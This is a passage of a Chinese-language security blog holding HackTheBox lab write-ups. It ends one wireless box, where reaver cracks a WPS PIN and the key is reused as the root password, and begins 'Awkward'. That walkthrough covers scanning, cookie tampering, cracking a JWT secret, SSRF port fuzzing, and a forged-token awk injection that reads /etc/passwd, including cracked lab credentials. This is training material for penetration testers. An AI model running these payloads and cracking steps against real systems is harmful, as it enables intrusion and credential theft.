<p><code>wpa_supplicant</code>是wifi客户端加密认证工具，和<code>iwconfig</code>不同，支持WEP、WPA、WPA2等完整的加密认证，而<code>iwconfig</code>只能支持WEP认证，与其相对应的AP端的加密认证工具为<code>hostapd</code></p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">systemctl status wpa_supplicant.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162713735.png"></p>
<blockquote>
<p>命令解释：</p>
<ol>
<li><code>/sbin/wpa_supplicant</code>: 这是 <code>wpa_supplicant</code> 工具的可执行文件的路径，它用于处理无线网络连接的认证和协商过程。</li>
<li><code>-u</code>: 以守护进程（daemon）的方式运行。这意味着 <code>wpa_supplicant</code> 将在后台持续运行，而不是在终端窗口中显示输出。</li>
<li><code>-s</code>: 生成系统日志（system log）信息，以便跟踪其操作和问题排查。</li>
<li><code>-c /etc/wpa_supplicant.conf</code>: 指定 <code>wpa_supplicant</code> 使用的配置文件的路径。在这种情况下，配置文件位于 <code>/etc/wpa_supplicant.conf</code>，这是一个常见的位置，用于存储无线网络连接的配置信息。该文件包含了网络的SSID（无线网络名称）和密码等信息。</li>
<li><code>-i wlan1</code>: 指定要用于无线连接的网络接口的名称。此处网络接口的名称是 <code>wlan1</code>，这通常是无线网卡的名称。</li>
</ol>
</blockquote>
<p>查看<code>hostapd</code>服务状态</p>
<pre class="line-numbers language-none"><code class="language-none">systemctl status hostapd.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162753397.png"></p>
<blockquote>
<p>命令解释：</p>
<ol>
<li><code>/usr/sbin/hostapd</code>: 这是 <code>hostapd</code> 工具的可执行文件路径，用于启动无线接入点服务。</li>
<li><code>-B</code>: 以守护进程（daemon）的方式运行，而不在终端窗口中显示输出。</li>
<li><code>-P /run/hostapd.pid</code>: 指定 <code>hostapd</code> 进程的 PID（Process ID）文件的位置。PID 文件用于存储 <code>hostapd</code> 进程的进程号，以便后续管理和监控。</li>
<li><code>/etc/hostapd/hostapd.conf</code>: 指定 <code>hostapd</code> 使用的配置文件的路径。这个文件包含了无线接入点的配置信息，如无线网络的名称（SSID）、加密方式、密码等。</li>
</ol>
</blockquote>
<p>用<code>iwconfig</code>命令查看无线网卡配置信息</p>
<blockquote>
<p>iwconfig 命令类似于ifconfig命令，但是它配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段等。</p>
</blockquote>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922162919258.png" style="zoom:80%;">

<p>可以看到：</p>
<p>mon0网卡模式是Monitor，说明是监控无线网络状态的接口，一般用于调试或者监控。</p>
<p>wlan1网卡模式是Managed，说明是被管理对象（即客户端），连接的AP的ESSID是<code>OpenWrt</code>，还可看到AP的BSSID（MAC地址）。</p>
<p>wlan0网卡模式是Master，说明是管理者（即AP）。</p>
<blockquote>
<p><strong>SSID</strong>就是手机上搜索到的wifi名字（本质是<strong>一串字符</strong>）。</p>
<p><strong>BSSID</strong>就是无线路由器的MAC地址（本质是<strong>一个MAC地址</strong>）。举例，一家公司面积比较大，安装了若干台无线接入点（AP或者无线路由器），每台设备的SSID都一样，员工只需要知道一个SSID就可以在无线范围内接入无线网络。<strong>BSSID其实就是每台设备的MAC地址</strong>。</p>
<p><strong>ESSID</strong>是一个抽象概念。上面的例子中，多台设备相同的SSID就统称为ESSID。</p>
</blockquote>
<p>用如下命令查看每个接口的链路状态信息</p>
<pre class="line-numbers language-none"><code class="language-none">iw dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可看到wlan0的地址和ssid和上面分析的完全对应，type值也是AP</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163041825.png" style="zoom:80%;">

<p>用如下命令查看程序文件的capabilities属性</p>
<pre class="line-numbers language-none"><code class="language-none">getcap -r / 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>getcap命令和Linux capabilities：<a href="https://www.cnblogs.com/sparkdev/p/11417781.html">https://www.cnblogs.com/sparkdev/p/11417781.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163139780.png"></p>
<p>用wash工具扫描wlan1和wlan2，看是否启用了WPS认证，发现都没有结果</p>
<pre class="line-numbers language-none"><code class="language-none">wash -i wlan2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163219038.png"></p>
<p>用reaver工具破解网络WPS PIN</p>
<pre class="line-numbers language-none"><code class="language-none">reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<ol>
<li><code>-i mon0</code>: 指定要用于无线监控的网络接口的名称。在这种情况下，指定的接口是 <code>mon0</code>，通常是一个用于监听无线网络流量的监视模式接口。<code>mon0</code> 接口通常是通过 <code>airmon-ng</code> 等工具创建的。</li>
<li><code>-b 02:00:00:00:00:00</code>: 指定目标无线网络的BSSID（基本服务集标识符）。</li>
<li><code>-vv</code>: 增加命令的详细度，使其输出更多的调试信息。<code>-v</code> 表示“详细模式”（verbose mode），使用两个 <code>-v</code> 表示更详细的输出。</li>
<li><code>-c 1</code>: 指定目标无线网络的信道号。此处信道号是 <code>1</code>，表示 <code>reaver</code> 将尝试破解与该信道关联的目标网络的WPS PIN。</li>
</ol>
</blockquote>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163336425.png"></p>
<p>成功获取WPA PSK，尝试以root身份登录，成功获取root权限</p>
<pre class="line-numbers language-none"><code class="language-none">WhatIsRealAnDWhAtIsNot51121!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922163601175.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230922211703945.png" style="zoom:67%;">]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>无线网络</tag>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Awkward</title>
    <url>/posts/d776b19d.html</url>
    <content><![CDATA[<h1 id="HTB-Awkward"><a href="#HTB-Awkward" class="headerlink" title="HTB-Awkward"></a>HTB-Awkward</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li>信息收集发现JWT和SSRF；</li>
<li>SSRF发现站点API；</li>
<li>审计API源码，发现可伪造JWT执行awk命令实现LFI拿到bean用户ssh；</li>
<li>连上ssh找到购物车源码，nginx敏感文件泄露找到admin账户；</li>
<li>审计购物车源码，发现删除购物车功能可利用sed命令实现RCE；</li>
<li>RCE反弹shell获取www-data用户权限；</li>
<li>执行pspy64发现mail命令及其目标文件leave_requests.csv；</li>
<li>利用mail命令和leave_requests.csv反弹shell获取root权限。</li>
</ol>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>Nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/桌面]
└─# nmap -sC -sV 10.10.11.185          
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-16 21:53 EST
Nmap scan report for 10.10.11.185
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.48 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（SSH）、80（HTTP）</p>
<p>80端口开放，直接URL打开IP，跳转到hat-valley.htb，那就添加进本地hosts文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.185 hat-valley.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217110323853.png"></p>
<p>目录扫描</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217111135831.png"></p>
<p>继续扫js目录</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">dirsearch -u http://hat-valley.htb/js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230217142128172.png"></p>
<p>app.js搜href，发现几个可疑目录<code>/dashboard</code>、<code>/leave</code>、<code>/hr</code>，依次打开，发现全部都会跳转到<code>/hr</code>，是个登录界面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220101615666.png" style="zoom:67%;">

<p>随便试，都会报用户名或密码错误，用Burp抓包发现Cookie字段有<code>token=guest</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220102134970.png" alt="image-20230220102134970"></p>
<p>burp直接修改成<code>token=admin</code>或者<code>token=administrator</code>，重放请求包，还是不行</p>
<p>用插件Cookie Editor编辑token值为admin，刷新页面，发现页面跳转到<code>/dashboard</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104116943.png"></p>
<p>或者也可以浏览器<code>F12</code>→<code>Storage</code>→<code>Cookies</code>修改、刷新页面，一样的效果</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105152758.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220104309900.png"></p>
<p>打开左侧菜单栏【Leave Requests】页面，留意到所有的离开请求会由Christine审核，猜测Christine应该是个权限不小的账户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221102637260.png"></p>
<p>然后在<code>F12</code>→<code>Network</code>→<code>XHR</code>（<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/send">XMLHttpRequest</a>）看到有两个api文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220105826149.png"></p>
<p>分别访问<code>http://hat-valley.htb/api/staff-details</code>和<code>http://hat-valley.htb/api/store-status</code>，<code>/api/store-status</code>页面没什么东西，<code>/api/staff-details</code>有<code>jwt malformed</code>报错信息</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230220130856612.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">JsonWebTokenError: jwt malformed
    at Object.module.exports [as verify] (/var/www/hat-valley.htb/node_modules/jsonwebtoken/verify.js:63:17)
    at /var/www/hat-valley.htb/server/server.js:151:30
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)
    at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)
    at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)
    at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)
    at next (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:280:10)
    at cookieParser (/var/www/hat-valley.htb/node_modules/cookie-parser/index.js:71:5)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>jwt malformed</code>报错是因为前端上传token的时候没有进行非空验证，导致token传给了服务端，这样就和服务端生成的token重复了。那么我们用CookieEditor插件或者F12删除cookie的token字段，也就是删除cookie，刷新页面，可以看到有四个用户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221100317693.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">username	"christine.wool"
password	"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649"
username	"christopher.jones"
password	"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1"
username	"jackson.lightheart"
password	"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436"
username	"bean.hill"
password	"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>目测是<code>64*4=256</code>位Hash，在线解一下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221101810630.png"></p>
<p>解出来一个用户</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">christopher.jones
chris123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>那么我们重新回到<code>http://hat-valley.htb/hr</code>页面，登录这个账户</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230221103219519.png"></p>
<p>看到<code>Staff Details</code>，果然，前面的判断没错，Christine是CEO，权限不小，还有两个销售和一个系统管理员</p>
<p>并且拿到了JWT token</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303104140690.png"></p>
<p>用脚本把这个JWT token转换成john格式，然后用john工具破解</p>
<p><a href="https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py">https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py</a></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; python3 jwt2john.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNocmlzdG9waGVyLmpvbmVzIiwiaWF0IjoxNjY3MDE3MTU3fQ.M5Yx5hMqtxf3hxrIJSjdLSdubkP6gFPtGzwsDDr7voI &gt; jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> jwt<span class="token punctuation">.</span>utils <span class="token keyword">import</span> base64url_decode
<span class="token keyword">from</span> binascii <span class="token keyword">import</span> hexlify


<span class="token keyword">def</span> <span class="token function">jwt2john</span><span class="token punctuation">(</span>jwt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """</span>
    jwt_bytes <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
    parts <span class="token operator">=</span> jwt_bytes<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span>

    data <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">b'.'</span> <span class="token operator">+</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    signature <span class="token operator">=</span> hexlify<span class="token punctuation">(</span>base64url_decode<span class="token punctuation">(</span>parts<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> <span class="token punctuation">(</span>data <span class="token operator">+</span> <span class="token string">b'#'</span> <span class="token operator">+</span> signature<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: %s JWT"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        john <span class="token operator">=</span> jwt2john<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>john<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">&gt; john -w=/usr/share/wordlists/rockyou.txt jwt_hash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303115143339.png"></p>
<p>获取到JWT token的secret值为<code>123beany123</code>，用<code>JWT Debugger</code>尝试，暂时没发现什么</p>
<h2 id="三、SSRF"><a href="#三、SSRF" class="headerlink" title="三、SSRF"></a>三、SSRF</h2><p>想起刚才发现的另一个API，<code>api/store-status?url="http://store.hat-valley.htb"</code>，可能存在SSRF</p>
<p>尝试<code>http://127.0.0.1:80</code>，被重定向到<code>http://store.hat-valley.htb</code>，证实存在SSRF</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">http://hat-valley.htb/api/store-status?url="http://127.0.0.1:80"--&gt;http://store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1:FUZZ"' -fs 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133754827.png"></p>
<p>三个端口80、3002、8080</p>
<p>3002是API文件，记录了站点的API信息及其源码，API名称如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Login (/api/login)
Submit Leave (/api/submit-leave)
All Leave (/api/all-leave)
Store Status (/api/store-status)
Staff Details (/api/staff-details)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303133933056.png"></p>
<p>8080页面空白，看源码发现hat-valley不能正常工作，要求开启JavaScript才能正常工作，没什么用</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303134214112.png"></p>
<h2 id="四、LFI"><a href="#四、LFI" class="headerlink" title="四、LFI"></a>四、LFI</h2><p>在其中一个API源码发现漏洞点，在28行exec函数里，有用户可控的参数user，通过操纵参数user，执行<a href="https://www.runoob.com/linux/linux-comm-awk.html">awk命令</a>读取文件（PS：题目名称Awkward原来体现在这）。而user值的获取，往前追溯代码，发现是通过decodedToken，然后取username字段得到的。</p>
<p>再往前追溯到头，发现是如下图所示的传递链，TOKEN_SECRET前面已经获得，值为<code>123beany123</code>，所以我们就可以通过JWT伪造请求头中Cookie字段的token值，从而操纵user值读取文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303161247753.png"></p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">app<span class="token dyadic-operator operator">.</span>get<span class="token punctuation">(</span><span class="token string">'/api/all-leave'</span><span class="token function">,</span> <span class="token punctuation">(</span>req<span class="token function">,</span> res<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
  const user_token <span class="token function">=</span> req<span class="token dyadic-operator operator">.</span>cookies<span class="token dyadic-operator operator">.</span>token
  var authFailed <span class="token function">=</span> false
  var user <span class="token function">=</span> null
  if<span class="token punctuation">(</span>user_token<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    const decodedToken <span class="token function">=</span> jwt<span class="token dyadic-operator operator">.</span>verify<span class="token punctuation">(</span>user_token<span class="token function">,</span> TOKEN_SECRET<span class="token punctuation">)</span>
    if<span class="token punctuation">(</span><span class="token function">!</span>decodedToken<span class="token dyadic-operator operator">.</span>username<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      authFailed <span class="token function">=</span> true
    <span class="token dfn builtin">}</span>
    else <span class="token dfn builtin">{</span>
      user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
    <span class="token dfn builtin">}</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span>authFailed<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>json<span class="token punctuation">(</span><span class="token dfn builtin">{</span>Error<span class="token dfn builtin">:</span> "Invalid Token"<span class="token dfn builtin">}</span><span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  if<span class="token punctuation">(</span><span class="token function">!</span>user<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Invalid user"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>
  const bad <span class="token function">=</span> <span class="token punctuation">[</span>"<span class="token punctuation">;</span>"<span class="token function">,</span>"<span class="token monadic-operator operator">&amp;</span>"<span class="token function">,</span>"<span class="token function">|</span>"<span class="token function">,</span>"<span class="token function">&gt;</span>"<span class="token function">,</span>"<span class="token function">&lt;</span>"<span class="token function">,</span>"<span class="token function">*</span>"<span class="token function">,</span>"<span class="token function">?</span>"<span class="token function">,</span>"`"<span class="token function">,</span>"$"<span class="token function">,</span>"<span class="token punctuation">(</span>"<span class="token function">,</span>"<span class="token punctuation">)</span>"<span class="token function">,</span>"<span class="token dfn builtin">{</span>"<span class="token function">,</span>"<span class="token dfn builtin">}</span>"<span class="token function">,</span>"<span class="token punctuation">[</span>"<span class="token function">,</span>"<span class="token punctuation">]</span>"<span class="token function">,</span>"<span class="token function">!</span>"<span class="token function">,</span>"<span class="token constant">#</span>"<span class="token punctuation">]</span>

  const badInUser <span class="token function">=</span> bad<span class="token dyadic-operator operator">.</span>some<span class="token punctuation">(</span>char <span class="token function">=</span><span class="token function">&gt;</span> user<span class="token dyadic-operator operator">.</span>includes<span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  if<span class="token punctuation">(</span>badInUser<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
    return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Bad character detected<span class="token dyadic-operator operator">.</span>"<span class="token punctuation">)</span>
  <span class="token dfn builtin">}</span>

  exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span><span class="token function">,</span> <span class="token punctuation">(</span>error<span class="token function">,</span> stdout<span class="token function">,</span> stderr<span class="token punctuation">)</span> <span class="token function">=</span><span class="token function">&gt;</span> <span class="token dfn builtin">{</span>
    if<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>new Buffer<span class="token punctuation">(</span>stdout<span class="token function">,</span> <span class="token string">'binary'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>
    if <span class="token punctuation">(</span>stderr<span class="token punctuation">)</span> <span class="token dfn builtin">{</span>
      return res<span class="token dyadic-operator operator">.</span>status<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token dyadic-operator operator">.</span>send<span class="token punctuation">(</span>"Failed to retrieve leave requests"<span class="token punctuation">)</span>
    <span class="token dfn builtin">}</span>

  <span class="token dfn builtin">}</span><span class="token punctuation">)</span>

<span class="token dfn builtin">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关键代码</p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl"><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
user <span class="token function">=</span> decodedToken<span class="token dyadic-operator operator">.</span>username
<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span>
exec<span class="token punctuation">(</span>"awk <span class="token string">'/" + user + "/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv"<span class="token function">,</span> <span class="token dfn builtin">{</span>encoding<span class="token dfn builtin">:</span> <span class="token string">'binary'</span><span class="token function">,</span> maxBuffer<span class="token dfn builtin">:</span> <span class="token number">51200000</span><span class="token dfn builtin">}</span>
<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>比如我们让<code>user=/' /etc/passwd '</code>，那么得到的命令如下</p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">awk <span class="token string">'//'</span> <span class="token monadic-operator operator">/</span>etc<span class="token monadic-operator operator">/</span>passwd <span class="token string">'/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>可以在自己本地测试</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303140858571.png"></p>
<p>用<a href="https://jwt.io/">JWT Debugger</a>，先将获取到的token复制到Encoded文本框里，然后修改Decoded文本框中username值为<code>/' /etc/passwd '</code>，然后左侧Encoded文本框就会实时出现伪造后的token值</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303150040606.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzc4MjAwNzN9.TyuC5rH79AtjGs4biOvMhtG0CHRm1HfLfrWqRhylrLk" | grep -i /bin/bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
